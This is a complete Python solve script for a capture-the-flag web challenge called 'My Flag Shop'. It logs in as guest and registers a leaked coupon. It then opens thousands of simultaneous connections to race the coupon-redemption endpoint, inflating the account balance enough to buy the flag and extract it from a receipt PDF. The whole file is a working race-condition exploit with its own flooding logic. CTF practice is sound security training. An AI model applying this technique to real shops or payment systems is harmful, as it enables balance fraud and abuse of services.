#!/usr/bin/env python3
# My Flag Shop - full solve
#   1. login guest:guest
#   2. reset + register the leaked coupon (value 10)
#   3. race /coupon/use with N pre-opened connections  -> balance = N*10
#   4. buy FLAG (/purchase/1) -> receipt PDF contains DH{...}
#
# Why raw sockets instead of Turbo Intruder:
#   /coupon/use does  check(used==0) -> sleep(50ms) -> addBalance -> setUsed.
#   Every request whose check runs inside that 50ms window adds +10, so we must
#   land ~1400+ requests simultaneously. We open all N TCP sockets FIRST, then
#   write the requests in a tight loop so they hit the server together.
import asyncio, re, sys, urllib.parse, urllib.request

HOST   = "host3.dreamhack.games"
PORT   = 10154                     
COUPON = "34a27d00d8bc51ac025df6033ef2927ef015161dbee2c15611ec6907be04bbcf"
N      = 3000            # concurrent connections; need > 1338 (13377/10)
BASE   = f"http://{HOST}:{PORT}"


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):   # keep the 302's Set-Cookie
        return None


def req(path, data=None, cookie=None):
    hdr = {}
    if cookie:
        hdr["Cookie"] = "session=" + cookie
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    if body is not None:
        hdr["Content-Type"] = "application/x-www-form-urlencoded"
    r = urllib.request.Request(BASE + path, data=body, headers=hdr)
    op = urllib.request.build_opener(_NoRedirect())
    try:
        resp = op.open(r)
        return resp.status, resp.read().decode("utf-8", "replace"), resp.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), e.headers


def login():
    _, _, h = req("/login", {"name": "guest", "password": "guest"})
    return re.search(r"session=([^;]+)", h.get("Set-Cookie", "")).group(1)


def balance(ck):
    _, b, _ = req("/mypage", cookie=ck)
    m = re.search(r"Balance:.*?([0-9]+)\s*won", b, re.S)
    return int(m.group(1)) if m else None


async def race(ck):
    body = urllib.parse.urlencode({"coupon": COUPON}).encode()
    raw = (f"POST /coupon/use HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
           f"Cookie: session={ck}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body

    async def open_one():
        try:
            return await asyncio.open_connection(HOST, PORT)
        except Exception:
            return None

    conns = [c for c in await asyncio.gather(*[open_one() for _ in range(N)]) if c]
    print(f"[*] opened {len(conns)} connections", file=sys.stderr)

    for _, w in conns:                       # fire everything ~together
        w.write(raw)
    await asyncio.gather(*[w.drain() for _, w in conns], return_exceptions=True)

    async def finish(r, w):
        try:
            await asyncio.wait_for(r.read(200), timeout=10)
        except Exception:
            pass
        try:
            w.close()
        except Exception:
            pass
    await asyncio.gather(*[finish(r, w) for r, w in conns], return_exceptions=True)


def main():
    ck = login()
    print("[+] session:", ck[:24] + "...")
    req("/coupon/reset", cookie=ck)
    _, b, _ = req("/coupon/register", {"coupon": COUPON}, cookie=ck)
    print("[+] register:", "Success" in b)
    print("[*] balance before race:", balance(ck))

    asyncio.run(race(ck))
    bal = balance(ck)
    print("[+] balance after race:", bal)
    if bal is None or bal < 13377:
        print("[!] not enough balance, raise N and retry")
        return

    # buy FLAG (member) exactly once; receipt is a PDF, flag sits in "address"
    import tempfile, subprocess, os
    op = urllib.request.build_opener(_NoRedirect())
    pdf = op.open(urllib.request.Request(BASE + "/purchase/1",
                                         headers={"Cookie": "session=" + ck})).read()
    p = os.path.join(tempfile.gettempdir(), "flag_receipt.pdf")
    open(p, "wb").write(pdf)
    try:
        txt = subprocess.check_output(["pdftotext", "-layout", p, "-"]).decode()
        m = re.search(r"DH\{[^}]+\}", txt)
        print("\n[+] FLAG:", m.group(0) if m else "(run: pdftotext -layout %s -)" % p)
    except FileNotFoundError:
        print("\n[+] receipt saved to", p, "- open it to read the flag")


if __name__ == "__main__":
    main()
